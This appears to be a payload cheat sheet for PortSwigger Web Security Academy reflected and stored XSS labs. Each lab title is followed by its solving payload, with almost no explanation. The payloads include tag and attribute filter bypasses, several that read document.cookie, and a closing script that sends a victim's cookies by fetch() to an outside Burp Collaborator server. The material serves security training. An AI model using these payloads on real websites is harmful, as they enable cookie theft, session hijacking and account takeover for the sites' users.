# Reflected XSS into HTML context with nothing encoded
<script>alert(1)</script>

# Reflected XSS into HTML context with most tags and attributes blocked
<img src=1 onerror=alert(document.cookie)>
<§§>
<body%20§§=1>

# Reflected XSS into HTML context with all tags blocked except custom ones
<script>
location = 'https://target-site.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

# Reflected XSS with event handlers and href attributes blocked
https://target-site.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

# Reflected XSS with some SVG markup allowed
# After following similar steps as those in part two
https://target-site.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Cdiscard%20onbegin=alert(1)%3E

# Reflected XSS into attribute with angle brackets HTML-encoded
"onmouseover="alert(1)

# Stored XSS into anchor href attribute with double quotes HTML-encoded
javascript:alert(1)

# Exploiting cross-site scripting to steal cookies using the public Burp Collaborator server (burpcollaborator.net)
<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

